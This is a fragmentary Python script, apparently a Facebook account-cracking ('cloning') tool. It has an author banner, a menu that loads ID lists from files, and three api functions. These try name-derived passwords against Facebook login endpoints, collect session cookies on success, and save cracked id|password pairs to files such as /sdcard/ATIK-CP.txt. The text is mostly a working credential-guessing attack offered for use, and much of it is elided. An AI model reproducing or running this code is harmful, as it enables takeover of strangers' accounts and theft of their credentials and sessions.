...
\033[1;36m╚═╝ ╚═╝       ╚═╝       ╚═╝    ╚═╝  ╚═╝
\033[1;33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;91m[\033[1;92m=\033[1;91m]\033[1;92m AUTHOR     ● DABIT SULTAN ATIK
\033[1;91m[\033[1;92m=\033[1;91m]\033[1;92m FACEBOOK   \x1b[1;92m● \x1b[1;92m DABIT SULTAN ATIK
\033[1;91m[\033[1;92m=\033[1;91m]\033[1;92m\x1b[1;92m Version    ● \033[1;32m1.1\033[1;32m
\033[1;91m[\033[1;92m=\033[1;91m]\033[1;92m\x1b[1;92m WHATSAPP   ● +8801608032030
\033[1;33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;32m[\033[1;31m●\033[1;35m Your_bit : 64
\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
...
def menu():
        try:
              #  approval()
                        ...
                        if xd in ['1','01']:
                                clear();print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : /sdcard/ATIK.txt ');linex()
...
def api1(ids,names,passlist):
        try:
                global oks,cps,loop
                sys.stdout.write(f'\r\r{G}[{R}ATIK-M1{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
'Connection': 'Keep-Alive',}
                        ...
                        if 'session_key' in po:
                                        print(f'\r\r{G}[{G}ATIK-OK{G}]{G} '+ids+f' | '+pas+'\033[1;97m')
                                        ...
                                        if 'y' in pcp:
                                                print(f'\r\r{G}[{Y}ATIK-CP{G}]{Y} '+ids+' | '+pas+'\033[1;97m')
...
def api2(ids,names,passlist):
        try:
                global oks,cps,loop
                sys.stdout.write(f'\r\r{G}[{R}ATIK-M2{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def api3(ids,names,passlist):
        try:
                global loop,oks,cps
                sys.stdout.write(f'\r\r{G}[{R}ATIK-M3{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print(f'\r\r{G}[{Y}ATIJ-CP{G}]{Y} '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/JEEVAN-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
...
"Content-Length": str(len(content_lenght))}
                        ...
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{G}[{G}ATIK-OK{G}]{G} '+uid+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        ...
                                        if 'y' in pcp:
                                                print(f'\r\r{G}[{Y}ATIK-CP{G}]{Y} '+uid+' | '+pas+'\033[1;97m')
        ...
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print(f'\r\r{G}[{Y}ATIK-CP{G}]{Y} '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/ATIK-CP.txt','a').write(uid+'|'+pas+'\n')
                                                cps.append(uid)
                                                break
                                        else:
                                                break
